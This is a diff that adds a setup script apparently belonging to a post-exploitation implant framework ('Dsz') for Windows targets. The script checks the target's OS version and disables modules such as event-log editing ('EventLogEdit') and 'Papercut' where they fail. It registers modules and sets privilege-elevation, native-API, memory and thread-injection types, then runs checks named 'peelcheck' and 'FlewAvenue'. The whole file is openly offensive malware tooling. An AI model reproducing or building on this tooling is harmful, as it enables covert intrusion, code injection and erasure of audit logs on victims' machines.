@@ -1,0 +1,64 @@
+@include "_CommandModification.dsi";
+@include "_LpHelperFunctions.dsi";
+@include "_Versions.dsi";
+@include "windows/_Windows2000.dsi";
+@include "windows/_WindowsVista.dsi";
+
+@echo off;
+@quiet off;
+
+if (_IsWindows2000())
+{
+	_DisableCommand("Firewall");
+	_DisableCommand("ProcessOptions");
+}
+
+int $major;
+int $minor;
+int $sp;
+if (_GetOsVersion($major, $minor, $sp))
+{
+	if (($major == 5) && ($minor == 1) && ($sp == 0))
+	{
+		# papercut doesn't work on XP SP0 boxes
+		_DisableCommand("Papercut");
+	}
+	else if (($major == 6) && ($minor == 0) && ($sp == 0))
+	{
+		# Vista SP 0 seems to work with log records in an odd manner not using record id's
+		# don't use eventlogedit
+		_DisableCommand("EventLogEdit");
+	}
+}
+
+# register all implementations
+`moduletoggle -register`;
+
+# maybe disable Handles
+`script Connected/winnt/_Handles.dss -project Dsz`;
+
+# maybe disable Papercut
+`script Connected/winnt/_Papercut.dss -project Dsz`;
+
+# set the Dsz_NtElevation type
+`script Connected/winnt/_Mcl_NtElevation.dss -project Dsz`;
+
+# set the Dsz_NtNativeApi type
+`script Connected/winnt/_Mcl_NtNativeApi.dss -project Dsz`;
+
+# set the Dsz_NtMemory type
+`script Connected/winnt/_Mcl_NtMemory.dss -project Dsz`;
+
+# set the Dsz_ThreadInject type
+`script Connected/winnt/_Mcl_ThreadInject.dss -project Dsz`;
+
+`python Connected/peelcheck.py -project Ops`;
+
+# make sure we have the correct process options
+`script Connected/winnt/_ProcessOptionsCheck.dss -project Dsz`;
+
+# check for flewavenue
+`script Connected/winnt/_FlewAvenueCheck.dss -project Dsz`;
+
+return true;
+
